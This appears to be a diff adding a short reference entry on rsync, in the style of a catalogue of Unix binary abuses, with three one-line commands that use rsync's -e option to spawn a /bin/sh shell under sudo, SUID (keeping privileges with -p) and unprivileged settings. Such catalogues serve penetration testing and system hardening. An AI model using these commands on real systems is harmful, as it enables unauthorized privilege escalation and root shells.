@@ -1,0 +1,14 @@
+rsync
+=====
+
+Shell
+-----
+
+[Sudo]
+    rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
+
+[SUID]
+    rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
+
+[Unprivileged]
+    rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
